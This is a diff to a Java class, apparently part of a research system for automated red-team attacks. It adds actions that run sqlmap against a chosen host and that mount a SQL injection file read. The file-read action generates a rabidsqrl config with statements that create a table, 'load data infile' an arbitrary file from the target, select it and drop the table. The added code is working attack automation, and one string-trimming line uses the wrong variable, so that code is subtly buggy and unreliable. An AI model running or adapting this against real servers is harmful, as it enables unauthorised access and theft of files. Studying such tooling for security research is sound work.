@@ -4,9 +4,12 @@
 package edu.isi.detergent;
 
 import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.PrintStream;
 import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.List;
@@ -81,6 +84,10 @@ public class Action {
 			} else if ("portScanner".equals(action.name())) {  // for now, say port scanner returns mysql server on
 				System.out.println("Action: " + action + " args: " + action.args());
 				return runPortScanner(action.args()[0].toString());
+			} else if ("sqlmap".equals(action.name())) {
+				return runSQLMap(action);
+			} else if ("sqlInjectionReadFile".equals(action.name())) {
+				return runSQLReadFile(action);
 			} else
 				return 1;
 		} else if ("check".equals(name)) {
@@ -107,6 +114,113 @@ public class Action {
 		//return Util.termArrayToList(new Term[]{});
 	}
 	
+	private Object runSQLReadFile(Term action) {
+		Term[] args = action.args();
+		String host = args[0].toString(), file = args[2].toString(), 
+				port = args[3].toString(), base = args[4].toString(), 
+				param = args[5].toString();
+		if (host.startsWith("'") && host.endsWith("'"))
+			host = host.substring(1,host.length()-1);
+		if (base.startsWith("'") && base.endsWith("'"))
+			base = base.substring(1,base.length()-1);
+		if (file.startsWith("'") && file.endsWith("'"))
+			file = file.substring(1,base.length()-1);
+		System.out.println("Running rabid readfile on " + host + " with port " + port + ", base " + base + 
+				" and parameter " + param + "\n");
+		// First create a config file for rabidsqrl
+		String fileName = "/tmp/rabid.conf";
+		try {
+			PrintStream out = new PrintStream(new File(fileName));
+			out.println("# Generated automatically by DASH red\n[\n   {");
+			out.println("    \"attack\": \"sql_inline\",");
+			out.println("    \"base_url\": \"" + base + "\",");
+			out.println("    \"attribute\": \"" + param + "\",");
+			out.println("    \"statements\": [");
+			out.println("        \"create table tmpread (line blob)\",");
+            out.println("        \"load data infile \\\"" + file + "\\\" into table tmpread\",");
+            out.println("        \"select * from tmpread\",");
+            out.println("        \"drop table tmpread\"");
+            out.println("        ]\n    }\n]");
+            out.close();
+		} catch (FileNotFoundException e1) {
+			e1.printStackTrace();
+		}
+		// execute the attack and put the results on stdout
+		ProcessBuilder scanBuilder = new ProcessBuilder("/Library/Frameworks/Python.framework/Versions/3.4/bin/python3",
+				"-m", "rabidsqrl", "-c", fileName, "-r");
+		List<Term>results = new LinkedList<Term>();
+		try {
+			Process scan = scanBuilder.start();
+			InputStream is = scan.getInputStream();
+			InputStreamReader isr = new InputStreamReader(is);
+			BufferedReader br = new BufferedReader(isr);
+			String line;
+			while ((line = br.readLine()) != null) {
+				System.out.println("Line is " + line);
+				// Doesn't currently process the data
+	        }
+	        //Wait to get exit value
+	        try {
+	            int exitValue = scan.waitFor();
+	            System.out.println("\n\nExit Value is " + exitValue);
+	            return "" + exitValue;
+	        } catch (InterruptedException e) {
+	            // TODO Auto-generated catch block
+	            e.printStackTrace();
+	        }
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return "1";
+	}
+
+	private String runSQLMap(Term action) {
+		Term[] args = action.args();
+		String host = args[0].toString(), port = args[1].toString(), base = args[2].toString(), 
+				param = args[3].toString();
+		if (host.startsWith("'") && host.endsWith("'"))
+			host = host.substring(1,host.length()-1);
+		if (base.startsWith("'") && base.endsWith("'"))
+			base = base.substring(1,base.length()-1);
+		System.out.println("Running sqlmap on " + host + " with port " + port + ", base " + base + 
+				" and parameter " + param + "\n");
+		System.out.println("Call is " + "/usr/bin/python" +
+				" ~/repo/Projects/ARL/sqlmapproject-sqlmap-1aafe85/sqlmap.py" +
+				" -u http://" + host + ":" + port + "/" + base
+				+ "?" + param + "=1");
+		
+		ProcessBuilder scanBuilder = new ProcessBuilder("/usr/bin/python",
+				"~/repo/Projects/ARL/sqlmapproject-sqlmap-1aafe85/sqlmap.py",
+				"-u" + "http://" + host + ":" + port + "/" + base
+				+ "?" + param + "=1");
+		List<Term>results = new LinkedList<Term>();
+		try {
+			Process scan = scanBuilder.start();
+			InputStream is = scan.getInputStream();
+			InputStreamReader isr = new InputStreamReader(is);
+			BufferedReader br = new BufferedReader(isr);
+			String line;
+			while ((line = br.readLine()) != null) {
+				System.out.println("Line is " + line);
+				// Doesn't currently process the data
+	        }
+	        //Wait to get exit value
+	        try {
+	            int exitValue = scan.waitFor();
+	            System.out.println("\n\nExit Value is " + exitValue);
+	            return "" + exitValue;
+	        } catch (InterruptedException e) {
+	            // TODO Auto-generated catch block
+	            e.printStackTrace();
+	        }
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return "1";
+	}
+
 	private Term runPortScanner(String host) {
 		if (host.startsWith("'") && host.endsWith("'"))
 			host = host.substring(1,host.length()-1);
